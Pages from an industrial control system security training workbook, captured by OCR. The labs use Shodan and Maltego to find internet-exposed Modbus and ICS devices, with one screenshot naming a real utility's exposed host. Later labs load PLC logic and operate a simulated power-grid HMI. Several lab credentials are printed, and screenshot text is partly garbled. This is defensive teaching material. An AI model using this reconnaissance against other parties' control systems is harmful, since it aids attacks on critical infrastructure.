© 2021, Robert M. Lee Lab 1.3-5
Exercise Takeaway:

Even organizations that practice industry-leading security practices put out information about themselves.
Product announcements, personnel to contact, geographical locations, etc. are all information commonly
available. Some organizations also find the need to put out information such as default passwords and
troubleshooting guides to ensure that their customers are able to quickly and easily access important systems.
This information, no matter how innocent, is all valuable to adversaries. Most information cannot be
eliminated, but organizations should be aware of what type of information they are putting out and reduce it
where possible. Internet-connected ICS devices, though, are not encouraged. ICS assets directly connected to
the Internet or those that show up on Shodan are very likely to be targeted successfully. Knowing how to
move from Google searches to Shodan searches to identify assets available to your organization is important
for security and increased monitoring and awareness. Shodan also has a new subset of its website which
reveals a map of Internet-connected ICS. The website also has all the associated data at the bottom of the
page for download and examination. Organizations should make sure their systems are not on this map or in
the data: https://icsmap.shodan.io

© 2021, Robert M. Lee Lab 1.3-6

awww

wi

www ww ww

ve we we Ww

oe w ww

oe @®

)

a Ss GG ws

Lab 1.4 - Maltego and Shodan ICS Heatmarp

e Create an ICS Heatmap in Maltego with Shodan

*Scenario Information* This exercise is an example of what an analyst should be doing to be kept up to date
with their ICS information attack space using publicly available data. It is an exercise that anyone assessing ICS
infrastructure should be keenly familiar with as Internet-connected ICS assets are one of the most widespread
problems in the industry today.

This exercise will use the SANS ICS RELICS VM. In this lab you will verify the network settings of the VM and
ensure connectivity through both network interfaces configured in the VM.

Task — Validate RELICS VM Network Settings = -—

> Launch VMWare Player
> Select the RELICS VM and then edit the virtual machine settings

> Ensure the VM Network Adapter is in Bridged mode and select the “configure adapters” option to
select the correct network adapter

> If prompted, select Yes on the UAC prompt

This VMware product requires administrator
"privilege. If you click Cancel, the application

will have limited functionality.

Verified publisher: VMware, Inc.
File origin: Hard drive on this computer

Show more details

> Uncheck all interfaces, except the ASIX interface

> When complete select OK

© 2021, Robert M. Lee Lab 1.4-1
Hardware Options

Device Summary Device status.
S8memory 46B | Connected
) Processors 2 | connect at power on

100 GB

Auto detect Network connection
Bridged (Automatic) @Bridged: Connected directly to the physical network

NAT
Present
Auto detect | ‘Configure Adapters

(Ci Repticate physical network connection state

CJbisplay Auto detect | OvNaT: used to share the host's IP address
ith the host

Automatic Bridging Settings x |

| Select the host network adapter(s) you want to automatically f
| bridge:

| MAASIK Ax88179 USB 3.0 to Gigabit Ethernet Adapter
(I Microsoft Wi-Fi Direct Virtual Adapter #2

| C)Mcrosoft wi-Fi Direct Virtual Adapter f
| Cointeice) wi-Fi 6 ax201 160mHz

(Ci intei(r) ethernet Connection (10) 1219-LM
[(JTaP-windows Adapter vo

[J siuetooth Device (Personal Area Network)

LAN Segments... Advanced...

OK Cancel Help

> You should also see a second “Network Adapter 2” with a NAT configuration. These network
adapters are configured in a manner to allow the bridged network adapter to communicate through
the physical network interface on the host to the PLC and the Windows VM. The second network
adapter is configured as NAT to enable the RELICS VM to also communicate out to the internet over
the host wireless adapter.

*Note: The VM network settings for the course will require a physical network connection from the host
workstation to the PLC and the Virtual machines will both be set in bridge mode to utilize a common physical
connection from the host. If prompted when you connect the USB to Ethernet adapter you should always
connect to host. We also edit the bridge connection settings to ensure the VM does not try to utilize a
different adapter when attempting to communicate with the PLC.

*Note* The steps to add and configure the USB adapter to your host and setup VM bridging will vary if you are
using VM Workstation Professional or VM Fusion. The steps provided in this lab are specific to VM Player.

> — Start the ICS515 RELICS VM, if prompted to download VM tools select “remind me later”

> Login to the VM
> LOGIN=relics
> PASSWORD = relics

> Inthe RELICS terminal window that launches on login, test a ping to the local PLC at 192.168.0.10 and
if successful press CNTRL + C to stop the ping and then test a ping to an external site like
www.google.com

© 2021, Robert M. Lee Lab 1.4-2
fl Terminal

S$ ping 1

PING 192.
bytes from 1
bytes from 192.
bytes from 192.

92.168.
ets transmitted,
rtt min/avg/max/mdev = 0

statisti
packet loss, time 2017ms
877/1.069/0.182 ms

S$ ping www.google.com
«google.com (
from slc09s01-in-f4.1e

217.15.2

8) 56(84) bytes of data.
et (172. icmp_seq=1 ttl=128

5s from slc09s01-in-f4.1e100.net (172.2 ttl=128 timeg

> If the pings fail, verify the USB to ethernet adapter is connected to the host, not the guest VM and
verify the network settings in the VM detailed above.

[Task ~ Generate Alerts for New ICS Assets Appearing in Shodan

*Note* There simply is not enough time in the day to routinely perform searches for Internet-facing devices,
but it is extremely important. Therefore, it is vital to learn how to generate alerts based on new devices
appearing in Shodan. Steps will be shown below to familiarize yourself with the Shodan command line
interface and generating alerts. A recommendation for automating this process will be given at the end of this
task.

>  Onyour RELICS VM, utilize the open Terminal window
> Execute the Terminal shortcut on the Desktop if needed

> View the Shodan command line interface (CLI) options
> Enter the following command in the Terminal:
shodan -h

vovvovoowvvoewveuoewebwbesewseuew”

w

vv Vv wow ww

> Note the commands that can be entered

© 2021, Robert M. Lee

Lab 1.4-3
[OPTIONS

ow this m

yen input data le into a
Returns the number of results for a search
Bulk data ac odan
a :
download
ore

the Shodan
external IP addres
anization's ac

e ults a
using Shodan.

Provide summary infor arch query
Stream data in real-tim
version Print version of this tool.

Enter your API key into the Shodan CLI so that you can reach Shodan’s API
> Obtain your API key, which may be found in “Account” on shodan.io, and should have been
saved to a file on your desktop after performing the previous lab

> Enter the following command into the Terminal, replacing APIKEY with your key via copy/paste:

shodan init APIKEY

Account Overview

Account Level Freelancer

API Key aac aria)

RR aaa era

*Note* You should explore the various Shodan commands in the Shodan CLI at some point after the lab. Here,
we will try one. Shodan CLI has access to the Streaming API, meaning you get data as it comes back directly to
Shodan instead of what has been indexed before. This means you do not get as much information, but you get
the newest information.

>  Doa Count of assets with the word modbus in their banners

> Enter the following command into the Terminal:
shodan count modbus

© 2021, Robert M. Lee Lab 1.4-4

@, ae, oe, @, m=, oe,

roy
vu vo wb wow Ww wwe & WW

Co we Ww Ww

oe F€@ GG Uw WG Ww

S$ shodan count modbus

396

*Note* It is important to be able to dig deeper into the data set than a simple count to validate what you find
and ensure that it is relevant to you. Counts can be a great first look at the data, though, especially to
anticipate high volumes.

> Search for devices that have the word “modbus” in an indexable field
> Enter the following command into the Terminal
shodan search --fields ip_str,port,org,hostnames,devicetype,title,html Modbus
> Press “q” to quit

§ shodan search --fields ip_str,port,org,hostnames ,devicetype,title,html Modbus

*Note* The output returns the information Shodan uses to build the data you see in the Shodan GUI on the
website. In the CLI, you can not only get access to the raw data but also select the fields you want instead of
gciting all of the data. This helps go through the data faster and in an easier fashion, The arguments set
include the IP address of the device, the port number the banner was seen on, the organization it is assigned,
hostnames of the device, and any titles or html banners returned. Not all the information must be present. As
an example, below there are some assets returned that do not have hostnames.

*Note* You can also search for the filters that you used in Shodan GUI, including specific ports as shown below.

vicetype,title,html port:502

*Note* Now that you have an understanding of the CLI and the information present within it, you can create
alerts. Alerts allow you to search for information as it comes into Shodan. It will not search what has been
indexed previously in Shodan, but instead alert you to new information that matches your query. This is one of
the best ways to stay aware of what external ICS devices and information assets you have showing up on
Shodan. You should use this information to put extra attention on those devices until they can be removed
from the Internet.

> Familiarize yourself with the Shodan Alert commands
> Enter the following command into the Terminal
shodan alert

© 2021, Robert M. Lee Lab1.4-5
shodan alert
sage: shodan alert [OPTIONS] COMMAND [ARGS]...

Manage the network alerts for your account

Options:
-h, --help Show this message and exit.

ommands:
clear Remove all alerts

create Create a network alert to monitor an external network

disable Disable a trigger for the alert

enable Enable a trigger for the alert

info Show information about a specific alert
List List all the active alerts

remove Remove the specified alert

triggers List the available notification triggers

> Create a basic alert to demonstrate the capabilities of the alert function
> Enter the following command into the Terminal:
shodan alert create “Test” 8.8.8.0/32

$ shodan alert create "Test" 8.8.8.0/32

*Note* Here we created an alert and gave it the name of “Test”. The IP range chosen is the Google DNS range.
However, the tool is not meant for monitoring larger ranges without engaging with John Matherly, the tool’s
founder. SANS ICS515 students have extra access to the API and tool for class purposes. Normally, using the API

in this way is meant as a premium feature.

© 2021, Robert M. Lee

Lab 1.4-6

@ @ @

@
ouvweveuwsvewsewswetebsetseusoeee

we ow

oe ww Ww

ew ww a

a5

Task — Create an ICS Heatmap in Maltego with Shodan

*Note* Maltego is a great tool to visualize data sets as well as enrich them with open-source data. The open-
source data is made available in “Transforms” which is similar to an API and a data set. Shodan has Transforms
for Maltego, which makes the tool combination extremely useful. Some of the transforms are open and freely
available (such as Shodan), and some Transforms are available from paid tools and databases.

1. In your RELICS VM, launch Maltego
> Execute the Maltego icon in the bottom tray

*Note* If it doesn’t appear after you launch it, check the toolbar at the top and select the
launched application; sometimes it starts to minimize

B+@mRHs @ && Maltego

Product Selection

Please choose how you want to use Maitego:

Maltego One is the new unified solution to access and activate Maltego plans for
Professionals and Enterprises,

Maitego eXtra Large is Paterva's premium solution to visualise large data sets and
allows for more than 10 000 entities in a single graph.

Maltego CE (Free) tn Maltego CE (Community Edition) the community transforms will be installed and
can be run to generate graphs, but the features are limited and the resulting
graphs may not be used for commercial purposes,

2. Complete the Setup Wizard
> Click Next and it will ask you to log in
i. If you do not have a Maltego login, then simply click “register here” and make an
account to use for this class; the accounts are free
> Click Next through the remaining screens, leaving the default options checked
» At the end of the Setup Wizard; the last screen will present an option for “Go Away I’ve Done
This Before”; click that option and click continue to exit the popup

3. Install the Shodan Transform

> On the main page of the application, there is the Transform Hub; scroll down to identify the
“Shodan” one, select it, and click “Install” and then “Yes” to the popup and enter your API key

© 2021, Robert M. Lee Lab 1.4-7
Maltego Transform Hub

Community Edition - No

Delve into global interconnection data using
PeeringDB.

Pipl
by Maltego Technologies

Contact support@maltege.com to gain access to
this Hub item. Speed investigations and fight ...

Shodan
by Maltego Technologies

Shodan is the world's first search engine for
Internet-connected devices. Query global toT .

Social Links CE

*Note* When you are finished, you will see the screen below or one similar to it noting that numerous new

[REFRESH]

65 Hub items total | 1 Hub item

Queries peoplemon.com

Polonious
* by Polonious Systems

Highly configurable investigation & case
management platform

Silobreaker
by Silobreaker

Threat intelligence Transforms from Silobreaker.

SocialNet

[UPDATE]

Transforms)

Use PhoneSearch to verify phone numbers,
providing real names, addresses, social ...

Q_ Recorded Future Inc.
* i ® by Recorded Future Inc.

Query Recorded Future for threat intelligence
information

Social Links PRO
by Social Links

Essential methods for intelligence and
investigations.

[_S8L_] SSL Certificate Transforms

transforms were installed. At the time of making this lab, there were five new transforms available.

© 2021, Robert M. Lee

Lab 1.4-8

0

oO, mm, @,

=,

@, @) a, @, @,

@,
veouvuwdeuvwsoebseuoewewbewoew”

ew Ww

wwe we we WF GF WH

4B

4.

Install Shodan

Complete

The following were added/updated:

1 Application Server
69 Transforms

21 Entities

1 Icons

10 Transform Sets

Open up a new map
> Click on the Maltego icon in the top left corner
> Select “New” from the drop-down menu

> A popup will show for running specific machines; just exit this window at its top right corner

© 2021, Robert M. Lee

Lab 1.4-9
Maltego Community|

5. Place an IPv4 asset on the map
> In the left-hand panel “Palette” select “infrastructure” to expand the window
> Drag and drop “IPv4 Address” onto the map

Maltego Community Eq

It o, Claer Grach'| wanker of Recuite | Privacy Mode on i
Bis ie a

TB 96 cut _aeameweRON '

Copy Paste athe fai] Normal YW | ouick Find

1 t
Delete Sia itis esse | Find File

New Graph (1)

Netblock CIDR

ef
CVE

DNS Name

Domain

IPv4 Address

IPv6 Address

\

74,207.243.85
wa y

*Note* You can monitor entire netblocks here as well as domains and other assets. It is advisable for this view
to monitor the netblock for your organization. This will be a quick way to visualize what Shodan knows about
your organization, including Internet-connected ICS assets.

© 2021, Robert M. Lee Lab 1.4-10
wo ws ww © ww wo we we we we we

nt

Se wee we ww ws WW

usp

*Note* Here, you would input your organization’s information. However, you should input an IP address of an
interesting asset you found in Shodan.io in the previous lab.

6. Change the IPv4 asset to an ICS asset you found in Shodan
> Double click on the asset on the map to change its IP
> Enter the IP in the popup window and exit the window (there is no save option needed)

7. Initiate a Query on the Asset
> Right click the asset
> Select the double arrow icon next to “Shodan” (looks like a fast-forward button), and select run
if prompted.

+ All Transforms »
+ Standard Transforms CE
+ Shodan x»

XXIHX OES

a a at ca lai ae

ojsuesl

*Note* The Shodan database is now being queried with information that relates to that IP address.

*Note* Information returned will be plotted especially noting the banners seen off of different ports accessible
on that IP address. Below, the ASN, GPS location, DNS, and FTP banner are returned. In the FTP banner, it had
the word Modbus.

eens
om
<& ¢
wTTP/2.0 203 Red MEDORA mb Oh, Hemme Deskvos _,  CVE-20IS-0708 con ntebe2a?
engi heme tah
‘x € @B 9
é we =.
agned JACKSON ENERGY AUTHORITY JACKSON ENERGY AUTHORITY 35 614S2,-B8 81255 53435 Jackson, United States Sa pial WTA tah
et ry me
ee on we
semis senans wet “o ne
a ious Senta Se
Innclanomieiseareiie. tee Lsmcea—_Faemaesh cA
© 2021, Robert M. Lee Lab 1.4-11
*Note* If we wanted to see more, we could click the icon and then the “...” in the Property View tab.

8081 - Service banner

| HTTP/1.0 302 Redirection
| Server: CIMPLICITY-HttpSvr/1.0

Date: Thu, 08 jul 2021 07:04:48 GMT
| Location: http://d46fl8c1/index. html

Tag

¢

GOL 1fOfe- 267

-~e@e

“s

1.1 206 OK

Remote Desktop PF... CVE-2019-0708

Banner Hash.

#

“rnsees9403

Banner Hash

3303 43 1622804862

AL Hash

ry

We

362218 “ goBt 443 3383

4a256 Firew are web CA

Firew are web CA

Certificate Serial

HeBee3474d22c83e. 1520353643,

ynamic properties
= da

a me

— Graph info

*Note* Feel free to run additional Transforms on the asset and anything returned. Much of what is returned in
OSINT through other Transforms should be very carefully assessed because it can be incorrect as is the nature
of OSINT. Other Transforms can help identify what information is publicly known, including public scans for
vulnerabilities, domain ownership information, and more. When complete, close Maltego and Discard
changes.

Exercise Takeaways : ;

Analysts should always be aware of what is publicly available about their assets. Public information often
needs a lot of automated and human analysis to make it useful. However, with knowledge about your
infrastructure and organization, such as the IP range you are using, you can create very useful alerts in Shodan
to be notified when information about your assets appears online. You can additionally visualize a much richer
set of data from the Shodan database to be kept aware of what adversaries can find out about you online.
Having this information is the key to reducing your information attack space and eliminating easy access paths
into your organization by adversaries.

© 2021, Robert M. Lee Lab 1.4-12

oo

oe

7. ff} * @® ®
ouvevveueseuuewbeuwsweewwewwes www

ow w w&

ao Ww

This exercise will utilize the Windows VM and the SANS ICS515 Student Kit. For troubleshooting please refer to
Exercise 1.1’s steps (including changing the IP to 169.254.x.x/16 range if needed).

Lab 2.1- Operating the Process

Load the operational logic into the PLC

Connect to and view the Operational sectors through an HMI

Understand process dependencies, normal system operation, emergency operations, and failure
modes

Task — Load the Operational Logicinto the PLC

1. Open the Windows VM
2. Load the operational logic file into the PLC

3.

> In the ics515 folder locate — “ICS515 Site Acceptance Test V1.ckp
> Double click the file to launch the CLICK programming software with the project

CLICK Programming Software {Version 3.01) - |CS515V8 for Production Boards.ckp - [Main Program] = oa x
Fie = [pHomes ft View Setup Progam narucion PLC Monitor Window Hep i ence hail

BOR Gp 4 Gino {Rung Comments i ivi § a addessPicker = Wig 2 Ofine | FAsau
< ise He Aline 1 Ades Consenots © Cross Reference Wy Dec Mode FB oeta view -
yrse Nicknames Softee fej Syntax Check POPE GR) Oc nae

Program Function PLC
Md initialize a
~ Mg] RemoteCommwd
~ tag TransAlorms
J Transmission
gy TranStates
_ fF Interrupt Program
 @ Address Picker
@ Edit Rung Comments
LD Local Program Information

Initialize

oe Edge Contact
& Compare

t
Eh enstates

Call,
onetime Generation

A Syntax Check Call
‘iG Cross Reference View > Gen_Fuel_Controt
eB] Monitor
BY status Monitor

all,
2 censtarms

FB date view
EB Dataview! v

Biinene

Wbioteger2words) Floating point He (Etec (Alasci ——---_——oonovaoon.—C2-0icu,

When the application opens, find in the top menu the icon with the Red Down arrow that is used to
Write a project into a PLC

© 2021, Robert M. Lee Lab2.1- 1
ows seit wb ww

vo wv © wo

ss FS FF FT we wT Ww

Lab 2.1-— Operating the Process

e Load the operational logic into the PLC

e Connect to and view the Operational sectors through an HMI

e Understand process dependencies, normal system operation, emergency operations, and failure
modes

This exercise will utilize the Windows VM and the SANS ICS515 Student Kit. For troubleshooting please refer to
Exercise 1.1’s steps (including changing the IP to 169.254.x.x/16 range if needed).

Task — Load the Operational Logicinto the PLC

1. Open the Windows VM
2. Load the operational logic file into the PLC
> In the ics515 folder locate — “ICS515 Site Acceptance Test V1.ckp
> Double click the file to launch the CLICK programming software with the project

CLICK Programming Software (Version 3,01) - ICS515V8 for Production Boards.ckp - [Main Program] - a x
erp ons i
BOR Gem an + Curr |) Rung Comments

My DC Mode FB deta view -
RB CpPCE ret
La States af

Program Function PLC

i initiatize

Ney RemoteCommw0
Ay TransAlarms
gy Transmission
gy TrenStates
BP Interrupt Program
© Address Picker
‘gf Edit Rung Comments
<x) Local Program Information
Syntax Check
16) Cross Reference View
EQ Monitor
AB status Monitor

Call ,
Initialize
Call,

[oem Geni States

all,
—— Generation

Cal
> Gen Fuel Control

Contact
GB Contact (NO)

GB Contact (NO)

a Edge Contact

[EB compare

3. When the application opens, find in the top menu the icon with the Red Down arrow that is used to

Write a project into a PLC

© 2021, Robert M. Lee

Lab 2.1- 1
A connection screen will appear, you may need to select Ethernet in the Port Type drop down and
you may need to select the Intel 82574 adapter (Asix as it is presented through the Bridge to the VM)
under the Network Adapter drop down. If you do not see the Intel adapter in the drop down, then
you will need to review your network settings and ensure the adapter is connected to the host, not

eo

o

the VM. You should see a PLC that has been discovered.

Connect to CLICK PLC

‘Switch Hub
‘Ths Computer eee
ss
ke r
" Bthemet or Ethernet i
Direct connection

Location of the target CLICK PLC

Port Type: Ethernet =
@ in the same LAN (Scan all CLICK PLCs in the LAN automatically.)

Network Adapter: bd
this LAN (You need ta allocate IP ‘and port number 5
Reeser By) Oouside (You te 1P address and por manually.)
tres! | PLC Name BP Address Subnet Mask -PartNumber Firmware Mode Status. Mac
Daddess: «192. 168.0.8 : oe

Sf Go00 TEE

}i92,168.0.10 —1255.255.255.0 _|C2010PU [ver3.00 |
Subnet Mask: 255,255.255.0

Default Gateway: 0.0.0.0

Click the Connect button
Enter the “sansics123” password

eo

fe

.3 °e rs)

a]

When prompted you can either continue with performing a Run Time edit or you can choose to place
the PLC switch in the STOP position. If you proceed with Run Time edit, choose the STOP PLC and
Continue option, which will then prompt you to return to RUN after the project has been written to

the PLC. This simply saves you the steps of flipping the switch on the PLC.

© 2021, Robert M. Lee

Lab 2.1- 2

7]

C

3

>

3

Mel
oY WD © WwW ww WY we we wewewwe we ww

oovs FF OU YD UF WD W

rite Project into PLC
PC

Project Name: {ICSS15V8 for Production Boards
Program Size (Total: 8,000 steps)
WiProgram Size: 1,173 steps ( 14.66 %)
Free Area: 6,827 steps( 85.34 %)

o 8,000

Project File (Total: 262,144 bytes)
WiProject Fie Suze 35,416 bytes ( 15,03 %)
Free Avea: 222,728 bytes ( 84.97 %)

° 262,144

Last Update: 2ul 08,2021, 14:35:55

(A Write Project Fie into PLC
By enabling this option, the project fle will be
downloadediWrite) into the PLC. If you want to dsable
project upload{Read), disable this option.

8. Youcan close the CLICK programming software

Task ~ Launch the Operator Human Machine Interface (HMI)

1. Open the MatrikonOPC Server for Modbus application

Al Apes

Racuments Satan Web More

® lectez tt pe ronan 3

Documents

= MatrikonOPC Server for Modbus
Quick Start Guide

‘= MatrikonOPc Server for Modbus
User Manual

Search suggestions
2 matiikonOPC server for modbus - see
-_

P matrikonOPC server for modbud

2. Select Yes to the UAC security prompt
3. Select File from the application menu
4. Select import configuration

PLC

[ez-o1ceu |
ProjectName: [ICS515 Mfg V3 for Producton Boards |
Program Size (Total: 8,000 steps)

CPU Type:

BiProgram Size: 265 stens{ 3.31 %)
iFree Area: 7,738 steps (96.69 %)
t) 8,000

Project File (Total: 262,144 bytes)

WiProject File Sue 17,456 bytes (6.65 %)
WiFree Ares: 244,688 bytes ( 93.35 %)
t) 262,144
Last Update: 3 07,2021, 19:33:48
ARUN Time Edit

By enabling this option, program will be downloaded into
the PLC without sinitching the PLC made to the STOP

mode.
[Ce]

MatrikonOPC Server for Modbus

@ MatrikonOPC Server for Modbus - {Locathost

File | Edt View Window Help

1) New Configuration

a acc
Local *,

Exit

import Configuration...
Export Configuration.

ye

}

EB Matrices OPC Server foe Mota

© 2021, Robert M. Lee

Lab 2.1- 3
5. Navigate to the Desktop\ics515\ Select — 1C$515_Matrikon_Config

] File fit Views Window _ Hele

© gf Brewer comguavon x
a nL Tene + Deiaog > Sudan Fer STS Sen 2
oH om Now ee -30

fe Gack access

© C8815 Matikon Conf
(Desktop 18515, Matilion Config

6.

iC Confirmation x ‘|

\ You are about to replace the currently active configuration.

Do you want to export it for later use before proceeding?

Cancel

7. Right click on the MatrikonOPC Server for Modbus > Persistence > make default
@ MatrikonOPC Server for Modbus - (Start Page]

@ File View Window Help

a 2

@ tx - @ Bie en

Location | MyMatrikonOPC » Localhost » MatrikenOPCServerforModbus >

8. Close the MatrikonOPC Server for Modbus application
9. Double click on the Matrikon Service Restart icon to stop and start the Matrikon service

11. If you receive a license notice indicating a 2 hour limit, select OK.

© 2021, Robert M. Lee Lab 2.1- 4

@ a ® &® @® &

eo

®2@oeennhemnheeeeteneaee

This notification will occur seven days after initial launch of the courseware Windows VM, so it should
not appear for in classroom students, however On Demand students may encounter it. Everything
will continue to function and all labs will work, however after the 7 day license period, the HMI
runtime will remain open for 2 hours periods and then close, requiring you to relaunch it when

VuuUuvUeuUbebe ewes

uv wo Ww

)

\p

)

wo Ww ¢

needed for a lab.

FactoryTaik View ME Station (2 Hour Limit]

An FactoryTalk View ME Station license was net found. The runtime will shut

down in two hours.

12. Click Yes on the prompt and then wait — good things are happening it may take 10 seconds be patient

Replace Local System Directory

13. Click Yes on the UAC prompt

The Application’s FactoryTalk System Directory for users and policies
will be loaded on this Terminal. The existing FactoryTalk System
Directory will be archived and will automatically be restored after the
runtime application is closed.

Please close all other programs that are currently accessing the Local
FactoryTalk directory. Select YES to continue or select NO to cancel
the loading of this Application.

No
IF8}

User Account Control

Do you want to allow this app to make é
changes to your device? ;

“BE UnpackMeR.dll in FactoryTalk Linx

Verified publisher: Rockwell Automation
File origin: Hard drive on this computer

Show more details

14. Select the “Run Application” button

© 2021, Robert M. Lee

Lab2.1-5
15. As the HMI Loads, navigate to the Main screen — With the breakers on the board in the Open position
and the Intertie Open, there is no power available in our simulated electrical system to service load.

FactoryTalk View ME Station - 10.00,00.290(Patch 03)

Current application

ICS515V1.mer

Load Application Run Application
IF) (F2i

Application Settings
(F3]

Delete Log Files
Before Running
(FS)

Terminal Settings

Yes

@ No

[Bf Power System HMI - Main

‘Generation

Switchyard Transmission
it
MW Output redken Breaker Protection Relay
Open Close Open Close Fault Reset
\ N me 7S 4 N\ Fe

Generator

1
'
1
1
~T
Load T
Min <> Max T
0 T
' N 7
mmm lA _ Reclosure
ks é.] ! fra Open Close
' ZN
y ¢ 1 N 4
Q Load
7 \. Power Meter (96) ' ns | Min <> Max
er as
1ZX& C8
© 2021 SANS ' ere) | ee)
Made in the USA 1 Ps 190
Industry —] \ CDairibaton —

‘Transmission Breaker Tipped
Generation Ares Critical asarm

‘Local Generator Nott Min For Breaker Closed
Generation area Critical arm

Local Generstor Not At Min For Steater Closed
Local Generator Notf Min For Breaker Closed

16. Weare effectively in a “blackstart” condition and will walk through a startup.
17. We will begin by navigating to the Generation tab

18. From the Generation screen we are going to perform some initial manual operations

© 2021, Robert M. Lee

x

Lab 2.1- 6

e,
www we OWUUUCTOWOKCOHOKHHOKCHH eS

19. Verify the CT fuel valve control is in Manual and the Generator is in Manual. If they are not, push the
Manual button in both areas

|

CT Fuel Valve Controls

@ Manual Mode
O Automatic Mode ™
@® Local Click PLC

1 % Open © OpenPic

Local or Manual

Mode
PLC
Open! i Mode

Inlet Air

@ CT Running O AVR On
Expert Mode

OCT Stopped © Manual Mode —~
Sim 8

On=UsePB's Start | Voltage Manual

Off = Auto Start Regulation Mode

7
Off

a
me WR) | 100 | Mw

20. With both settings in Manual, enter 50 in the CT fuel valve Manual Mode Setpoint field and enter 100
in the Combustion Turbine Manual Mode Setpoint (using the data entry number pad, enter the value
you want and then you use the bottom right arrow indicating Enter)

é

*Note* Click on and Acknowledge all red Reset Alarms; as you go to clear alarms
during the Blackstart start-up procedure in this lab.

21. Navigate to the Transmission and Distribution tab and click the Green Intertie Generation breaker, it
should turn Red indicating an energized condition.

Franamissian | | Residential Industrial Trends Login igs

Generation Distribution 2:05:42 PM

TRANSFER BUS

| Lamda
Transmission
SI Breaker

j [Faun] 0 [resee

MW Consumption | MW Consumption
0 % ‘ 0 mw
ag BS sa
© 2021, Robert M. Lee Lab2.1-7
22. With intertie connection closed (Red = energized) to the larger bulk electric system, return to the
Generation screen and close the Generation switchyard breaker

fs Transmision ‘ ‘TiRi2021
Main Generstion (| gymemision | Residential Industrial Alarms Trends Login are EXIT
CT Fuel Valve Controls Generation Interlock Status
e © tonal Mode Bee) eee | @ trterie On
% O Automatic Mode Be Pascal Breaker Permissives
@ Local Click PLE z © Gscecatee Renning
% Open © OpanPLc @ Trans. Breaker Closed
@ Trans. Protection Relay
Locator wou Manual © Load Present
Control Control Setpoint
/ ‘
Serie] RIEIN| [-] one
Inlet Air Steam Turbine
"ie
Combustion Turbine
100 Mw
@ Cr Running OAVR On Power Power Power
Expert Mode ©) CT Stopped @Manval Mode On Consumption Generation Available
onstsepss | SBR Voltage Manual Industiat [0] MW Local [100] mw Local [_ 200) ww
ot pes. Eb Mie < Mode — 7
Off = Auto Start Regulation Resiterita 77 ] WW intertie 0 MW Intertie 500 nw
—ea
Off <a MW) Total ww Total 100 myy Total | 780 Mw

23. You should now see 100 MW of Generation being delivered into the interconnection
24. Navigate to the Transmission and Distribution tab and Reset the Protection Relay then Close the

Lamda Transmission Breaker

Main Genersticn Residential

Industria Alarms

TRANSFER BUS.

Login

Foal ame] |

rane

10:3534 PM RIT,

Generation Residential

TRANSFER BUS,

Industrist

Login

Lambda
Transmission
Protection

e .
en.
oy

© 2021, Robert M. Lee

Ps

7

risiteat
10:45:33 PM.

Lab 2.1- 8

eo

oe.

o

oe, oe] o om @ oe o ca] oe wo o

°,
www wo wo Oo wow wow we wo we wy

oe)

\p TY \p ‘py

vy

25. Navigate to the Residential tab and close the Reclosure

Transmision

Generation Residential Industrial Alarms

& Distribution

7/8/2024
10:48:39 PM.

Login

Lake Trout Way

26. Before we start.to add load to the system, Navigate back to the Generation tab and put the CT valve

Current Load
Max Load

Control in Auto and the Generation control in Automatic Voltage Regulation (AVR)

Transmision

Generation | |g Distribution

Residential

CT Fuel Valve Controls

&

0

Local or
OpenPLC
Control

Expert Mode
Sim 8

On = Use PB's

Off = Auto Start

Of

O Manual Mode
@ Automatic Mode
@ Local Click PLC
© OpenPLe

Manual
Mode
Setpoint

50

@CTRunning @ AVR On

OCT Stopped © Manual Mode On

Voltage
Regulation

Inlet Air

Manual
Mode

yassetpount....

| mw

27. Turn the Residential and Industry quadrant dials up to add load. You should see the Generator MW

output ramp up to meet the new load

28. Navigate to the Trends tab and select Power, now if you manipulate the load dials you should see this

increase / decrease in load displayed

© 2021, Robert M. Lee

Lab 2.1- 9
Transmision
& Distribution

7/8/2021

Residential Industrial 53:43 PM

Generation

Power Consumption

(MW)
intial (MW)

Intertie - Available vs Supply
BB aAvailadie (ww)
BB Supply (aw)

Local Generation - Available vs Supply

Close

Refinery A MW Draw [299 | mw Refinery B
ea ;

on Current Output [99 % oe
Sor Maxuw [300 |] uw ae

30. Navigate through the four quadrant screens and click the Reset Alarm button to Acknowledge the
past alarms.

31. When complete, feel free to look at additional trends, while manipulating the system either through
the physical controls on the board or through the HMI.

© 2021, Robert M. Lee Lab 2.1- 10

@® @ ®@® ®@ ® ® ® WW ®

ww
wowewwewwe www ww wy

we we w

oe ww G&G ww

“3 ee Ww

[if Power System HMI - Main _ x

Transmision
& Distribution

7/8/2021
5:02:08 PM

Generation Residential industrial Trends Login

EXIT

Transmission

Switchyard = Configuration
MW Output Brosken Breaker Protection Relay
Open Close Open Close Fault Reset
N 7 » ¢ N 7
ZN 7 oN
Generator } |
S16. /10-
oe
OTS /o-
oO o—
T
T
1
OAS Reclosure
! eng Open Close
1 /
1
WANN 5 4 Load
7 \. PowerMeter(%) | ns) —| Min <> Max
1 ets
LA ae? 7 ats
© 2021 SANS 99 I ena fa ae
Made in the USA i y Lc? 100
Industry I Distribution
‘Alarm time ‘Acknowledge time Message — |
7/8/2021 4:58:10 PM Transmission Breaker Tipped
7182021 4:57:25 PM Generation Area Critical Alarm
7/0/2021 4:57:25 PM Local Generator NotAt Min For Breaker Closed
7/8/2024 4:57:05 PM Generation Area Critical Alarm
7/8/2021 457:05 PM Local Generator Not At Min For Breaker Closed
7/9/2021 4.56.55 PM Local Generator Not Al Min For Breaker Closed
7112021 4:56:53 PM Generation Area Critical Alarm

Task — Perform Manual Field Operation

1. With the system up and residential subdivisions energized (meaning the three houses are lit)

2. Simulate a power system fault (famous squirrel attack, car crashes into a pole, downed wires due to
storm, etc) that causes a loss of load by clicking the distribution reclosure open button on the board.

3. You should note that the industrial load is not impacted, you should also see the state change reflected
on the HMI

4. In addition there is a critical alarm present in the HMI, this alarm state is prohibiting you from closing
the reclosure in the field (attempt to push the close button in the residential area).

5. Clear the alarm condition from the field by pushing the Sim switch 6 to an On state and then turning it
off. (You will note the alarm condition has been acknowledged in the HMI from the field)

6. Now try to push the close button to restore power to the residential area

7. When the system is in an unacknowledged alarm condition, typically an investigation / or inspection
would need to occur in order to acknowledge the alarm and reenergize the system, in case there was a
safety concern in the field

© 2021, Robert M. Lee Lab2.1- 11
Additional Information

The Sim card can provide helpful manual controls in the event that the operator HMI is unavailable:
e Sim 1: Generator Fuel Flow Valve Control
o O=No Remote PLC
o 1=Controlled by Remote PLC
Sim 2: Summer / Winter Ratings for Protection Relay
o O=Winter
o 1=Summer
e Sim 3: Intertie Reset
o O=NA
o 1=On (if Open, will close)
e Sim 4: Ack Generation Alarms
